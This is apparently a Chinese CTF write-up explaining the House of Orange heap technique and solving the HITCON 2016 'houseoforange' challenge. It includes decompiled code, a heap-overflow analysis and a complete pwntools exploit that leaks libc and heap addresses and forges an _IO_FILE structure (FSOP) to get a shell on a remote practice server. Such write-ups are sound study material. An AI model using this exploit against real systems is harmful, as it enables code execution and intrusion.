# House of orange
## 前提
题目中不存在 free 函数或其他释放堆块的函数。
## 原理
House of Orange 核心就是通过漏洞利用获得 free 的效果。当前堆的 top chunk 尺寸不足以满足申请分配的大小的时候，原来的 top chunk 会被释放并被置入 unsorted bin 中，通过这一点可以在没有 free 函数情况下获取到 unsorted bins。
## 利用方法
	1.篡改top chunk size（注意size需要对齐内存页）
	2.分配比top chunk size大的chunk。
	3.现在原来的top chunk进入了unsorted bin中，再次malloc就会从unsored bin中切分出需要的大小，剩余部分作新的unsorted bin。

### 注意：伪造top chunk size时，必须满足以下要求

	1.伪造的size必须要对齐到内存页。
	2.size要大于MINSIZE。
	3.size要小于之后申请的chunk size + MINISIZE。
	4.size的prev inuse位必须为1。
	5.malloc的大小不能大于mmap分配阈值。

# 例题 
## houseoforange_hitcon_2016
 ![在这里插入图片描述](https://img-blog.csdnimg.cn/c9f278bf58b84b5588446c344a510595.png)
保护全开，打开ida

## main函数
	void __fastcall __noreturn main(const char *a1, char **a2, char **a3)
	{
	  int choice; // eax
	
	  sub_1218();
	  while ( 1 )
	  {
	    while ( 1 )
	    {
	      menu();
	      choice = my_read(a1, a2);
	      if ( choice != 2 )
	        break;
	      show();
	    }
	    if ( choice > 2 )
	    {
	      if ( choice == 3 )
	      {
	        edit();
	      }
	      else
	      {
	        if ( choice == 4 )
	        {
	          puts("give up");
	          exit(0);
	        }
	LABEL_13:
	        a1 = "Invalid choice";
	        puts("Invalid choice");
	      }
	    }
	    else
	    {
	      if ( choice != 1 )
	        goto LABEL_13;
	      add();
	    }
	  }
	}

## add函数
会申请三个chunk，chunk_1存放chunk_2和chunk_3的mem指针，chunk_2存放name，chunk_3存放price和color。由于num2的限制，只能使用4次add函数。

	int add()
	{
	  unsigned int size; // [rsp+8h] [rbp-18h]
	  int color; // [rsp+Ch] [rbp-14h]
	  _QWORD *v3; // [rsp+10h] [rbp-10h]
	  _DWORD *v4; // [rsp+18h] [rbp-8h]
	
	  if ( num2 > 3u )                              // num开始为0，可利用add4次
	  {
	    puts("Too many house");
	    exit(1);
	  }
	  v3 = malloc(0x10uLL);   //chunk_1
	  printf("Length of name :");
	  size = my_read();
	  if ( size > 0x1000 )
	    size = 0x1000;
	  v3[1] = malloc(size);     //chunk_2
	  if ( !v3[1] )
	  {
	    puts("Malloc error !!!");
	    exit(1);
	  }
	  printf("Name :");
	  my_read2((void *)v3[1], size);
	  v4 = calloc(1uLL, 8uLL);      //chunk_3
	  printf("Price of Orange:");
	  *v4 = my_read();
	  ::color();
	  printf("Color of Orange:");
	  color = my_read();
	  if ( color != 0xDDAA && (color <= 0 || color > 7) )
	  {
	    puts("No such color");
	    exit(1);
	  }
	  if ( color == 0xDDAA )
	    v4[1] = 0xDDAA;
	  else
	    v4[1] = color + 30;
	  *v3 = v4;
	  heap_array = v3;
	  ++num2;
	  return puts("Finish");
	}
## show函数
	int sub_EE6()
	{
	  int v0; // eax
	  int v2; // eax
	
	  if ( !heap_array )
	    return puts("No such house !");
	  if ( *(_DWORD *)(*heap_array + 4LL) == 0xDDAA )
	  {
	    printf("Name of house : %s\n", (const char *)heap_array[1]);
	    printf("Price of orange : %d\n", *(unsigned int *)*heap_array);
	    v0 = rand();
	    return printf("\x1B[01;38;5;214m%s\x1B[0m\n", *((const char **)&unk_203080 + v0 % 8));
	  }
	  else
	  {
	    if ( *(int *)(*heap_array + 4LL) <= 30 || *(int *)(*heap_array + 4LL) > 37 )
	    {
	      puts("Color corruption!");
	      exit(1);
	    }
	    printf("Name of house : %s\n", (const char *)heap_array[1]);
	    printf("Price of orange : %d\n", *(unsigned int *)*heap_array);
	    v2 = rand();
	    return printf("\x1B[%dm%s\x1B[0m\n", *(unsigned int *)(*heap_array + 4LL), *((const char **)&unk_203080 + v2 % 8));
	  }
	}
## edit函数
存在漏洞，修改chunk时的size大小由我们自己修改，可造成堆溢出，修改下一个chunk的内容，edit函数有num作为限制，只能使用3次

	int sub_107C()
	{
	  _DWORD *v1; // rbx
	  unsigned int size; // [rsp+8h] [rbp-18h]
	  int v3; // [rsp+Ch] [rbp-14h]
	
	  if ( num > 2u )                               // num开始为0，可利用edit3次
	    return puts("You can't upgrade more");
	  if ( !heap_array )
	    return puts("No such house !");
	  printf("Length of name :");
	  size = my_read();
	  if ( size > 0x1000 )
	    size = 4096;
	  printf("Name:");                              // size由我们输入，存在溢出
	  my_read2((void *)heap_array[1], size);
	  printf("Price of Orange: ");
	  v1 = (_DWORD *)*heap_array;
	  *v1 = my_read();
	  color();
	  printf("Color of Orange: ");
	  v3 = my_read();
	  if ( v3 != 0xDDAA && (v3 <= 0 || v3 > 7) )
	  {
	    puts("No such color");
	    exit(1);
	  }
	  if ( v3 == 0xDDAA )
	    *(_DWORD *)(*heap_array + 4LL) = 0xDDAA;
	  else
	    *(_DWORD *)(*heap_array + 4LL) = v3 + 30;
	  ++num;
	  return puts("Finish");
	}
## 分析
程序不存在free函数，而按照我们的一般思路都是先free一个大于0x7f的chunk，进入unsortedbin，获得libc基地址，之后覆盖hook函数为system函数获得shell。而这道题不能这样做，add和edit函数的使用次数也有限制，这道题的edit函数存在堆溢出，可以考虑使用House of orange，通过修改top chunk为一个比较小的值，然后分配一个很大的chunk，使top chunk进入unsortedbin，从而泄露libc，这样heap基地址也能泄露出来，之后的话，可以使用FSOP，获得shell。
## 过程
先把前面的写好

	# coding=utf-8
	from pwn import  *
	 
	context(endian='little',os='linux',arch='amd64',log_level='debug') #小端序，linux系统，64位架构,debug
	 
	binary = './houseoforange_hitcon_2016'  
	#sh = process(binary) #连接本地程序
	sh = remote('node4.buuoj.cn',26188) #连接远程程序
	elf = ELF(binary)     
	libc = ELF('../../libc-2.23.so--64')  
	
	#libc-2.23.so--64
	one_gadget = [0x45216,0x4526a,0xf02a4,0xf1147]
	one_gadget[0] = 0x45216
	s       = lambda data               :sh.send(data)
	sa      = lambda delim,data         :sh.sendafter(delim, data)
	sl      = lambda data               :sh.sendline(data)
	sla     = lambda delim,data         :sh.sendlineafter(delim, data)
	r       = lambda num=4096           :sh.recv(num)
	ru      = lambda delims  :sh.recvuntil(delims )
	itr     = lambda                    :sh.interactive()
	uu32    = lambda data               :u32(data.ljust(4,'\0'))
	uu64    = lambda data               :u64(data.ljust(8,'\0'))
	leak    = lambda name,addr          :log.success('{} = {:#x}'.format(name, addr))
	lg=lambda address,data:log.success('%s: '%(address)+hex(data))
	#定义gdb调试函数
	def dbg():
	        gdb.attach(sh)
	        pause()
	def add(size, content, price='2', color='1'):
	    ru("Your choice : ")
	    sl('1')
	    ru("Length of name :")
	    sl(str(size))
	    ru("Name :")
	    sh.send(content)
	    ru("Price of Orange:")
	    sl(str(price))
	    ru("Color of Orange:")    #1-7
	    sl(str(color))
	
	
	def show():
	    ru("Your choice : ")
	    sl('2')
	
	def edit(size, content, price='2', color='1'):
	    ru("Your choice : ")
	    sl('3')
	    ru("Length of name :")
	    sl(str(size))
	    ru("Name:")
	    sh.send(content)
	    ru("Price of Orange:")
	    sl(str(price))
	    ru("Color of Orange:")    #1-7
	    sl(str(color))
### 修改top chunk
随便申请一个chunk，然后利用edit函数，溢出修改topchunk
	
	add(0x30,'aaaa\n')
	dbg()
	payload = 'a' * 0x30 +p64(0) + p64(0x21) + p32(2) + p32(2) + p64(0) * 2 + p64(0xf81)
	edit(len(payload), payload)
	dbg()
![在这里插入图片描述](https://img-blog.csdnimg.cn/a23256312ac74a1c922b94fb13e84135.png)
top chunk大小为0x0000000000020f81
修改后的top chunk 大小为0x0000000000000f81
![在这里插入图片描述](https://img-blog.csdnimg.cn/259e73d11d5f45ad823f0a9bf7ff1f12.png)
### 申请大于top chunk的chunk，进入unsortedbin
	add(0x1000, 'a\n')
	dbg()
![在这里插入图片描述](https://img-blog.csdnimg.cn/d36f2307ea63433d8af823bfb7a100a0.png)
### 泄露libc和heap
调试可得此时我们刚刚申请的0x400chunk里存放着0x00007fe0c1216188距离libc基地址0x3c5188（0x00007fe0c1216188-0x7fe0c0e51000），该chunk里还存放着heap地址，因为printf遇到'\x00'会停止打印，所以我们将0x00007fe0c1216188改为字符串b，再将其输出

	add(0x400, 'a' * 8)
	show()
	ru('a'*8)
	libc.address = u64(ru('\x7f').ljust(8, '\x00')) - 0x3c5188
	lg('libc.address',libc.address)
	io_list_all = libc.symbols['_IO_list_all']
	system = libc.symbols['system']
	dbg()

![在这里插入图片描述](https://img-blog.csdnimg.cn/b0e56ad2215f45969686d4431486c9cd.png)

我们泄露出的heap为0x5617117b30e0，距离heap基地址0x5617117b30e0-0x5617117b3000=0xe0，由此可获得heap_base地址

	payload = 'b' * 0x10
	edit(0x10, payload)
	show()
	ru('b'*0x10)
	heap = u64(sh.recvuntil('\n').strip().ljust(8, '\x00'))
	heap_base = heap - 0xE0
	lg('heap_base',heap_base)
	dbg()
![在这里插入图片描述](https://img-blog.csdnimg.cn/2f717d520ea740d1acf13b1f48f78f98.png)
### 构造fake_file
接下来我们修改当前unsortedbin中chunk的大小和内容,这里FSOP还不太明白，先借用一下大佬写的解释

malloc时，对unsorted bin进行判断，此时该chunk的size为0x60，不满足要求，就把该chunk放入small bin，并且向bk->fd写入main_arena+0x58，即向_IO_list_all写入main_arena+0x58，此时判断下一个unsorted bin（_IO_list_all），而这里实际上没有chunk，此时会触发错误，此时第一个_IO_FILE_plus结构体为main_arena+0x58，而它不满足条件，就通过_chain调到下一个_IO_FILE_plus结构体，_chain位于0x68偏移的地方，main_arena+0x58+0x68=main_arena+0xc0，就是small bin中0x60大小的地方，这就回到了我们伪造的_IO_FILE_plus结构体
	 
    
    dbg()
	payload = 'a' * 0x400 + p64(0) + p64(0x21) + p32(2) + p32(1) + p64(0)
	fake_file = '/bin/sh\x00'+p64(0x61)#to small bin
	fake_file += p64(0)+p64(io_list_all-0x10)
	fake_file += p64(0) + p64(1)#_IO_write_base < _IO_write_ptr
	fake_file = fake_file.ljust(0xc0,'\x00')
	fake_file += p64(0) * 3
	fake_file += p64(heap_base+0x5E8) #vtable ptr
	fake_file += p64(0) * 2
	fake_file += p64(system)
	payload += fake_file
	edit(len(payload), payload)
	dbg()
修改前
 ![在这里插入图片描述](https://img-blog.csdnimg.cn/e49a2d19a419461eb89c5c1b58bf3f99.png)
修改后
![在这里插入图片描述](https://img-blog.csdnimg.cn/c6487fe320ee4b1880bcd2c64cca274f.png)

之后我们再调用add函数，调用malloc函数，就可以产生错误信息，改变程序执行流程，获得shell
	
	ru("Your choice : ")
	sl('1')
	itr()
### exp
	
	# coding=utf-8
	from pwn import  *
	 
	context(endian='little',os='linux',arch='amd64',log_level='debug') #小端序，linux系统，64位架构,debug
	 
	binary = './houseoforange_hitcon_2016'  
	#sh = process(binary) #连接本地程序
	sh = remote('node4.buuoj.cn',26188) #连接远程程序
	elf = ELF(binary)     
	libc = ELF('../../libc-2.23.so--64')  
	
	#libc-2.23.so--64
	one_gadget = [0x45216,0x4526a,0xf02a4,0xf1147]
	one_gadget[0] = 0x45216
	s       = lambda data               :sh.send(data)
	sa      = lambda delim,data         :sh.sendafter(delim, data)
	sl      = lambda data               :sh.sendline(data)
	sla     = lambda delim,data         :sh.sendlineafter(delim, data)
	r       = lambda num=4096           :sh.recv(num)
	ru      = lambda delims  :sh.recvuntil(delims )
	itr     = lambda                    :sh.interactive()
	uu32    = lambda data               :u32(data.ljust(4,'\0'))
	uu64    = lambda data               :u64(data.ljust(8,'\0'))
	leak    = lambda name,addr          :log.success('{} = {:#x}'.format(name, addr))
	lg=lambda address,data:log.success('%s: '%(address)+hex(data))
	#定义gdb调试函数
	def dbg():
	        gdb.attach(sh)
	        pause()
	def add(size, content, price='2', color='1'):
	    ru("Your choice : ")
	    sl('1')
	    ru("Length of name :")
	    sl(str(size))
	    ru("Name :")
	    sh.send(content)
	    ru("Price of Orange:")
	    sl(str(price))
	    ru("Color of Orange:")    #1-7
	    sl(str(color))
	
	
	def show():
	    ru("Your choice : ")
	    sl('2')
	
	def edit(size, content, price='2', color='1'):
	    ru("Your choice : ")
	    sl('3')
	    ru("Length of name :")
	    sl(str(size))
	    ru("Name:")
	    sh.send(content)
	    ru("Price of Orange:")
	    sl(str(price))
	    ru("Color of Orange:")    #1-7
	    sl(str(color))
	
	
	
	add(0x30,'aaaa\n')
	#dbg()
	payload = 'a' * 0x30 +p64(0) + p64(0x21) + p32(2) + p32(1) + p64(0) * 2 + p64(0xf81)
	 
	edit(len(payload), payload)
	#dbg()
	add(0x1000, 'a\n')
	#dbg()
	add(0x400, 'a' * 8)
	#dbg()
	show()
	ru('a'*8)
	libc.address = u64(ru('\x7f').ljust(8, '\x00')) - 0x3c5188
	lg('libc.address',libc.address)
	  
	io_list_all = libc.symbols['_IO_list_all']
	system = libc.symbols['system']
	
	payload = 'b' * 0x10
	 
	
	edit(0x10, payload)
	
	show()
	ru('b'*0x10)
	heap = u64(sh.recvuntil('\n').strip().ljust(8, '\x00'))
	heap_base = heap - 0xE0
	lg('heap_base',heap_base)
	#dbg()
	 
	payload = 'a' * 0x400 + p64(0) + p64(0x21) + p32(2) + p32(1) + p64(0)
	fake_file = '/bin/sh\x00'+p64(0x61)#to small bin
	fake_file += p64(0)+p64(io_list_all-0x10)
	fake_file += p64(0) + p64(1)#_IO_write_base < _IO_write_ptr
	fake_file = fake_file.ljust(0xc0,'\x00')
	fake_file += p64(0) * 3
	fake_file += p64(heap_base+0x5E8) #vtable ptr
	fake_file += p64(0) * 2
	fake_file += p64(system)
	payload += fake_file
	edit(len(payload), payload)
	#dbg()
	 
	ru("Your choice : ")
	sl('1')
	
	itr()
可能因为本地环境没配好，打不通，在buu上远程可以打通
![在这里插入图片描述](https://img-blog.csdnimg.cn/a54c5f2bc33e4c2f8519058f1e79b38d.png)
>参考文章
>[houseoforange_hitcon_2016](https://www.cnblogs.com/LynneHuan/p/14696780.html)
>[houseoforange_hitcon_2016](https://blog.csdn.net/weixin_44145820/article/details/105270036)

